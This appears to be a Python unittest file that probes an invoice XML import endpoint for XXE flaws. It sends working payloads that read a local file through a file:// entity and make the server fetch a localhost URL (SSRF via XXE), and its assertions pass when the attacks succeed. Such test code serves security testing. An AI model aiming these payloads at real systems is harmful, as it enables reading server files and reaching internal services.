import unittest
import requests
import time
import os
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from dotenv import load_dotenv
import logging
import sys

print("Starting test module initialization...")  # Early debug print

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)
logger.info("Logger initialized")

# Load environment variables
load_dotenv()
logger.info("Environment variables loaded")

# Configuration
API_URL = os.getenv('API_URL', 'http://localhost:3000')
TEST_PORT = int(os.getenv('TEST_PORT', '8891'))  # Using a different port from SSRF/SSTI tests
logger.info("Configuration loaded: API_URL=%s, TEST_PORT=%d", API_URL, TEST_PORT)

class TestHTTPHandler(BaseHTTPRequestHandler):
    test_marker = None
    
    def do_GET(self):
        logger.info("[TestServer] Received request from %s: %s", self.client_address, self.path)
        logger.debug("[TestServer] Headers: %s", self.headers)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response = f"XXE Test Response: {self.test_marker}"
        self.wfile.write(response.encode())
        logger.info("[TestServer] XXE request verified!")
    
    def log_message(self, format, *args):
        pass

class TestServer:
    def __init__(self, port=TEST_PORT, test_marker=None):
        self.port = port
        self.server = None
        TestHTTPHandler.test_marker = test_marker
        logger.info("[TestServer] Initializing test server on port %d", port)
    
    def start(self):
        try:
            # Check if port is available
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', self.port))
            if result == 0:
                logger.error("[TestServer] Port %d is already in use", self.port)
                sock.close()
                raise Exception(f"Port {self.port} is already in use")
            sock.close()

            logger.info("[TestServer] Starting HTTP server...")
            self.server = HTTPServer(('0.0.0.0', self.port), TestHTTPHandler)
            server_thread = threading.Thread(target=self.server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            logger.info("[TestServer] Server thread started on port %d", self.port)
            
            # Test if server is listening
            try:
                logger.debug("[TestServer] Testing connection...")
                test_conn = socket.create_connection(('127.0.0.1', self.port), timeout=1)
                test_conn.close()
                logger.info("[TestServer] Successfully verified server is listening")
                
                # Make a test request
                try:
                    logger.debug("[TestServer] Making self-test request...")
                    test_response = requests.get(f"http://localhost:{self.port}/test", timeout=1)
                    logger.info("[TestServer] Self-test request successful: %d", test_response.status_code)
                except Exception as e:
                    logger.warning("[TestServer] Self-test request failed: %s", str(e))
            except Exception as e:
                logger.warning("[TestServer] Could not verify server is listening: %s", str(e))
                
        except Exception as e:
            logger.error("[TestServer] Error starting server: %s", str(e))
            raise
    
    def stop(self):
        if self.server:
            logger.info("[TestServer] Shutting down server...")
            self.server.shutdown()
            self.server.server_close()
            logger.info("[TestServer] Server shutdown complete")

class TestXMLVulnerabilities(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        """Set up test environment."""
        logger.info("\nSetting up XML vulnerability test environment...")
        cls.server = TestServer(test_marker="XXE-TEST")
        cls.server.start()
    
    @classmethod
    def tearDownClass(cls):
        """Clean up test environment."""
        logger.info("\nCleaning up XML vulnerability test environment...")
        cls.server.stop()
    
    def setUp(self):
        self.base_url = API_URL
        # Create test file
        with open('/tmp/xxe_test.txt', 'w') as f:
            f.write('XXE_TEST_CONTENT')
        logger.info("[Test] Created test file with content")
    
    def tearDown(self):
        if os.path.exists('/tmp/xxe_test.txt'):
            os.remove('/tmp/xxe_test.txt')
            logger.info("[Test] Removed test file")
    
    def test_invoice_xxe_file_read(self):
        """Test XXE vulnerability in invoice import endpoint"""
        logger.info("[Test] Starting XXE file read test...")
        xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/xxe_test.txt">]>
        <invoice><customer>Test</customer><items><item>&xxe;</item></items></invoice>'''
        
        logger.info("[Test] Sending XXE file read request...")
        try:
            response = requests.post(
                f'{self.base_url}/api/invoice/import/xml',
                data=xml_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10  # 10 seconds timeout
            )
            
            logger.info("[Test] Response status: %d", response.status_code)
            logger.debug("[Test] Response body: %s", response.text)
            
            self.assertEqual(response.status_code, 200)
            response_data = response.json()
            self.assertTrue(response_data['success'])
            self.assertIn('XXE_TEST_CONTENT', response_data['data']['items'][0])
            logger.info("[Test] XXE file read test passed")
        except requests.Timeout:
            logger.error("[Test] Request timed out after 10 seconds")
            raise
        except Exception as e:
            logger.error("[Test] Request failed: %s", str(e))
            raise
    
    def test_invoice_xxe_ssrf(self):
        """Test SSRF via XXE in invoice import endpoint"""
        logger.info("[Test] Starting XXE SSRF test...")
        xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8891/xxe-test">]>
        <invoice><customer>Test</customer><items><item>&xxe;</item></items></invoice>'''
        
        logger.info("[Test] Making XXE SSRF request to http://localhost:8891/xxe-test")
        try:
            response = requests.post(
                f'{self.base_url}/api/invoice/import/xml',
                data=xml_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10  # 10 seconds timeout
            )
            
            logger.info("[Test] Response status: %d", response.status_code)
            logger.debug("[Test] Response body: %s", response.text)
            
            self.assertEqual(response.status_code, 200)
            response_data = response.json()
            self.assertTrue(response_data['success'])
            self.assertIn('XXE Test Response', response_data['data']['items'][0])
            logger.info("[Test] XXE SSRF test passed")
        except requests.Timeout:
            logger.error("[Test] Request timed out after 10 seconds")
            raise
        except Exception as e:
            logger.error("[Test] Request failed: %s", str(e))
            raise

if __name__ == '__main__':
    unittest.main(verbosity=2) 